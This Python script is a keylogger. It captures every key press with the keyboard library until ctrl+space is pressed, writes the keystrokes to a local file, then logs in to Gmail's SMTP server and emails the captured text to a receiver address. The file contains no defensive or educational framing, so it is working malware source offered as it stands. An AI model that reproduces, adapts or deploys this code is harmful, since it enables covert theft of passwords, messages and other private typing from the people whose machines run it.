import keyboard
import smtplib

keyboard_red = []
s = smtplib.SMTP('smtp.gmail.com', 587)
txt_file = open('logger.txt', 'r')

def send_logs():
    s.starttls()
    s.login("EMAIL_ID_USER@gmail.com", "EMAIL_ID_PASSWORD")
    message = txt_file.read()
    s.sendmail("SENDER_EMAIL", "RECEIVER_EMAIL", message)
    s.quit()

def logger():
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN and not keyboard.is_pressed('ctrl+space'):
            keyboard_red.append(event)
        elif keyboard.is_pressed('ctrl+space'):
            break

    with open('logger.txt', 'w') as Writer:
        for event in keyboard_red:
            if event.name == 'space':
                event.name = " "
            elif event.name == 'shift':
                event.name = ""
            elif event.name == 'ctrl':
                event.name = ""
            elif event.name == 'enter':
                event.name = " \n"
            elif event.name == 'backspace':
                event.name = ""
            Writer.write(f"{event.name}")
    send_logs()      

if __name__ == "__main__":
    logger()
